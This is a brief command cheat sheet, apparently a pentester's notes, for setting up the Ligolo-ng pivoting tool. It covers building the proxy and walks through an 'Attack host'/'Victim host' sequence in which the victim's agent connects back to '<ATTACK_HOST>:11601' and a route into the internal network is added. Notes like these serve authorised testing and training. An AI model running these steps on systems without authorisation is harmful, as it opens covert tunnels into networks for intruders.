# Ligolo

https://github.com/nicocha30/ligolo-ng
https://docs.ligolo.ng/

```bash
# Compiler
git clone https://github.com/nicocha30/ligolo-ng.git
cd ligolo-ng
go build -o proxy cmd/proxy/main.go

# Version Pré-Compilée
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.3/ligolo-ng_proxy_0.8.3_linux_amd64.tar.gz
```

```bash
sudo ./proxy -selfcert -api-laddr 127.0.0.1:9090
interface_create --name "pivot"
```

```
# Attack host - Run our proxy server
sudo ligolo-proxy -selfcert

# Attack host - Establish a new interface for our pivoting
ligolo-proxy >> ifcreate --name pivot

# Victim host - Connect back to our ligolo server 
ligolo-agent -connect <ATTACK_HOST>:11601

# Attack host - List connected sessions and choose our established session from previous step
ligolo-proxy >> session

# Attack host - Create tunnel to the victim host
[Agent : HOSTNAME] >> tunnel_start --tun pivot 

# Attack host - Add routing to internal network
ligolo-proxy >> route_add --name pivot --route <INTERNAL_NETWORK>/<CIDR>
```